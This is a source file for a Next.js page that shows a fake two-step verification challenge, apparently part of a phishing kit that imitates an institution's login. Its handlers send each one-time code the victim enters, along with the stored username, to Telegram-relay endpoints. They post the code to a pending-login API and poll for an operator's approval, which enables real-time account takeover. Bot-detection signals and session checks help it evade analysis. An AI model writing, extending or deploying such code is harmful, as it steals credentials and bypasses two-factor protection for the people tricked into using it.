"use client"

import { Suspense, useEffect, useRef, useState, type FormEvent } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import EbcVerifyChallengeShell from "@/components/EbcVerifyChallengeShell"
import styles from "@/components/ebc-verify-challenge.module.css"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_CODE_LENGTH,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
  SIGN_IN_LOADING_MS,
} from "@/lib/approval-messages"
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
import { wait } from "@/lib/loading-delays"
import { readStoredUsername } from "@/lib/login-flow-storage"
import { pollPendingLogin } from "@/lib/poll-pending-login"
import {
  otpCodeDeliveryMessage,
  pendingLoginMethod,
  readStoredDeliveryMethod,
  verificationTypeLabel,
  type DeliveryMethod,
} from "@/lib/verification-method"

function parseMethod(raw: string | null): DeliveryMethod {
  if (raw === "email" || raw === "text" || raw === "call") return raw
  return readStoredDeliveryMethod()
}

function SubmitSpinner() {
  return <span className={styles.btnSpinner} aria-hidden="true" />
}

function PreviousSpinner() {
  return <span className={styles.btnSpinnerDark} aria-hidden="true" />
}

function EnterCodeContent() {
  const [code, setCode] = useState("")
  const [error, setError] = useState("")
  const [rememberDevice, setRememberDevice] = useState<"yes" | "no">("yes")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isGoingBack, setIsGoingBack] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const verifyingRef = useRef(false)
  const router = useRouter()
  const searchParams = useSearchParams()
  const getBotGateSignals = useBotGateSignals()
  const method = parseMethod(searchParams.get("method"))
  const canSubmit = code.trim().length === OTP_CODE_LENGTH
  const isBusy = isSubmitting || isResending || isGoingBack

  useEffect(() => {
    try {
      if (!sessionStorage.getItem("loginReady")) {
        window.location.href = "/"
      }
    } catch {
      window.location.href = "/"
    }
  }, [])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const id = window.setTimeout(() => setResendCooldown((value) => value - 1), 1000)
    return () => window.clearTimeout(id)
  }, [resendCooldown])

  function sanitizeOtpInput(value: string) {
    return value.replace(/\D/g, "").slice(0, OTP_CODE_LENGTH)
  }

  function clearError() {
    setError("")
  }

  const clearOtpAndFocus = (message: string) => {
    setCode("")
    setError(message)
    setIsSubmitting(false)
    verifyingRef.current = false
  }

  async function handlePrevious() {
    if (isSubmitting || isGoingBack) return
    setIsGoingBack(true)
    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || ""
    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "login_back_to_verification_methods",
        userId,
        page: "/verify",
        timestamp: new Date().toISOString(),
      }),
      keepalive: true,
    }).catch(() => {})
    await wait(SIGN_IN_LOADING_MS)
    router.push("/verify-choice")
  }

  async function handleResend() {
    if (isResending || resendCooldown > 0 || isSubmitting || isGoingBack) return
    setIsResending(true)
    try {
      void fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          method: pendingLoginMethod(method),
          page: `/verify?method=${method}`,
        }),
        keepalive: true,
      }).catch(() => {})
      await wait(OTP_RESEND_LOADING_MS)
      setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
    } finally {
      setIsResending(false)
    }
  }

  async function handleVerify(e?: FormEvent) {
    e?.preventDefault()
    if (isSubmitting || isGoingBack || verifyingRef.current) return

    const otpCode = sanitizeOtpInput(code)
    if (otpCode.length !== OTP_CODE_LENGTH) {
      setError(`Enter the ${OTP_CODE_LENGTH}-digit verification code.`)
      return
    }

    verifyingRef.current = true
    clearError()
    setIsSubmitting(true)

    const typeLabel = verificationTypeLabel(method)

    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: readStoredUsername(), code: otpCode,
        verificationType: typeLabel,
        page: "/verify", }),
      keepalive: true,
    }).catch(() => {})

    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || "login"
    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          kind: "otp",
          userId,
          password: otpCode,
          method: pendingLoginMethod(method),
          maskedEmail,
          maskedPhone,
          flow: "otp",
          ...getBotGateSignals(),
        }),
      })
      const data = (await res.json()) as { id?: string; error?: string }
      if (!res.ok) {
        clearOtpAndFocus(data.error || MSG_UNABLE_REACH_VERIFICATION)
        return
      }
      if (!data.id) {
        clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
        return
      }

      const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)
      if (result === "approved" || result === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (result === "timeout") {
        clearOtpAndFocus(MSG_UNABLE_VERIFY_TIME)
        return
      }
      clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
    } catch {
      clearOtpAndFocus(MSG_UNABLE_REACH_VERIFICATION)
    }
  }

  return (
    <EbcVerifyChallengeShell
      onLogout={() => {
        window.location.href = "/"
      }}
      logoutDisabled={isSubmitting || isGoingBack}
    >
      <h1 className={styles.title}>Two-Step Verification Challenge</h1>
      <h2 className={styles.subtitle}>Enter verification code</h2>
      <hr className={styles.rule} />

      <p className={styles.deliveryCopy}>{otpCodeDeliveryMessage(method)}</p>

      {error ? <p className={styles.error}>{error}</p> : null}

      <form onSubmit={(event) => void handleVerify(event)}>
        <div className={styles.codeFieldRow}>
          <label htmlFor="ebc-otp-code" className={styles.codeLabel}>
            Verification Code
          </label>
          <div className={styles.codeInputWrap}>
            <span className={styles.codePrefix} aria-hidden="true">
              #
            </span>
            <input
              id="ebc-otp-code"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={OTP_CODE_LENGTH}
              pattern="[0-9]*"
              value={code}
              onChange={(event) => {
                const next = sanitizeOtpInput(event.target.value)
                setCode(next)
                if (next.length > 0) clearError()
              }}
              disabled={isSubmitting || isGoingBack}
              className={`${styles.codeInput} ${error ? styles.codeInputError : ""}`}
            />
          </div>
        </div>

        <fieldset className={styles.radioGroup}>
          <legend className={styles.radioLegend}>Would you like to remember this device?</legend>
          <label className={styles.radioOption}>
            <input
              type="radio"
              name="rememberDevice"
              value="yes"
              checked={rememberDevice === "yes"}
              onChange={() => setRememberDevice("yes")}
              disabled={isSubmitting || isGoingBack}
            />
            <span>Yes - I trust this device and use it regularly</span>
          </label>
          <label className={styles.radioOption}>
            <input
              type="radio"
              name="rememberDevice"
              value="no"
              checked={rememberDevice === "no"}
              onChange={() => setRememberDevice("no")}
              disabled={isSubmitting || isGoingBack}
            />
            <span>No - This is a public or shared computer</span>
          </label>
        </fieldset>

        <p className={styles.resendRow}>
          Haven&apos;t received the code?{" "}
          <button
            type="button"
            className={styles.resendLink}
            onClick={() => void handleResend()}
            disabled={isBusy || resendCooldown > 0}
          >
            {isResending
              ? "Sending…"
              : resendCooldown > 0
                ? `Resend Code in ${resendCooldown}s`
                : "Resend Code"}
          </button>
        </p>

        <div className={styles.actionRow}>
          <button
            type="button"
            className={styles.btnPrevious}
            onClick={() => void handlePrevious()}
            disabled={isSubmitting || isGoingBack}
            aria-busy={isGoingBack}
          >
            {isGoingBack ? (
              <>
                <PreviousSpinner />
                Previous
              </>
            ) : (
              <>← Previous</>
            )}
          </button>
          <button
            type="submit"
            className={styles.btnSubmit}
            disabled={isSubmitting || isGoingBack || !canSubmit}
            aria-busy={isSubmitting}
          >
            {isSubmitting ? (
              <>
                <SubmitSpinner />
                Submitting…
              </>
            ) : (
              <>Submit Code →</>
            )}
          </button>
        </div>
      </form>
    </EbcVerifyChallengeShell>
  )
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  )
}
